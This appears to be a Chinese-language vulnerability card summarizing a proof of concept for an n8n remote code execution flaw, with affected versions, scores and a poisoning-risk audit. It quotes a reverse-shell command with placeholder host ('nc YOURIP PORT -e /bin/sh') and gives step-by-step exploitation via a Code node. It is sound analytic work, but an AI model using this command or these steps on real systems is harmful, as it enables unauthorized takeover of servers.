## CVE-2025-68613 - n8n RCE (远程代码执行)

**漏洞编号:** CVE-2025-68613

**漏洞类型:** RCE (远程代码执行)

**影响应用:** n8n

**危害等级:** 严重 (CRITICAL)

**CVSS评分:** 9.9

**影响版本:** 0.211.0 至 1.120.3 及 1.121.0

**利用条件:** 需要能够访问n8n控制台界面；需要目标配置了NODE_FUNCTION_ALLOW_BUILTIN环境变量以允许执行内置Node.js模块（如child_process）。

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

POC有效性分析：该漏洞被称为表达式注入（Expression Injection）导致的代码执行。根据提供的POC代码，利用的核心在于n8n工作流引擎中‘Code’节点的Javascript执行功能。在受影响的版本中，如果系统管理员为了扩展功能而配置了环境变量 NODE_FUNCTION_ALLOW_BUILTIN=* 或包含了敏感模块如 child_process，攻击者可以通过构造恶意的工作流脚本直接调用 Node.js 的底层 API。POC展示了两种利用场景：首先是通过 execSync('whoami') 获取当前用户权限和文件列表，验证了同步命令执行的能力；其次是通过反弹 Shell 命令（nc YOURIP PORT -e /bin/sh）建立远程持久化访问。该POC逻辑清晰，直接利用了 Node.js 的原生能力，只要目标环境配置不当且未修补漏洞，其执行成功率极高。从防御角度看，这种利用方式并不涉及复杂的内存溢出或绕过，而是对应用逻辑层权限控制缺陷的直接利用。利用步骤：1. 部署或定位到一个版本在 0.211.0 至 1.121.0 之间且开启了内置模块权限的 n8n 实例。2. 登录 n8n 控制台，新建一个工作流。3. 添加一个 'Code' 节点并选择 'Javascript' 模式。4. 在代码编辑框中输入基于 child_process 的恶意代码，例如用于信息收集或反弹 Shell 的脚本。5. 点击 'Execute Step' 运行该节点，此时代码将在 n8n 容器或服务器上下文中执行，从而实现对宿主机的控制。 投毒风险分析：经过对提供的 POC 项目结构和代码内容的审计，其投毒风险较低。该仓库主要包含 README 说明文件和纯文本格式的利用示例（n8nexploit.txt）。代码中没有发现经过混淆处理的二进制数据、Base64 加密的恶意载荷或自动向外部未知 IP 发送敏感数据的静默脚本。README 中包含明确的法律免责声明，建议在受控的实验室环境中进行测试，并给出了升级到 1.120.4+ 的修复建议，符合安全研究的标准实践。利用代码中虽然包含反弹 Shell 的示例，但其格式为占位符（YOURIP PORT），要求使用者手动修改，这降低了其被直接作为自动化恶意软件传播的可能性。唯一需要注意的是，用户在复制此类 POC 时应保持警惕，确保脚本中没有被植入隐蔽的远程命令执行链接，但在当前的静态分析中，该 POC 表现为纯粹的功能验证工具，未见针对研究员个人的后门或投毒行为。

**项目地址:** n8n_CVE-2025-68613_exploit_payloads (Local Copy)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2025-68613](https://nvd.nist.gov/vuln/detail/CVE-2025-68613)
